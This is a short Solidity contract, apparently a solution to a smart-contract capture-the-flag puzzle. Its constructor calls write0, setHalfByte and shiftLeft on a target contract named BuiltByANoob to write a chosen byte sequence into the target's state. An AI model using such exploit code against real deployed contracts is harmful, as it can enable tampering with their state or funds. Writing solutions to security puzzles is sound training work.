pragma solidity 0.7.2;

import "./BuiltByANoob.sol";

contract naps62Attacker {

    uint8[] values = [0x01, 0x00, 0x0b, 0x05, 0x07, 0x0e, 0x06, 0x0d, 0xa, 0x00];
    
    constructor(BuiltByANoob instance) payable {
        
        instance.write0();        

        for(uint i = 0; i < values.length/2; i++) {
            bytes1 n1 = bytes1(values[2*i]);
            bytes1 n2 = bytes1(values[2*i+1]);

            instance.write0();
            instance.setHalfByte(n1);
            instance.shiftLeft(4);
            instance.setHalfByte(n2);
        }

    }

    receive() external payable { }

}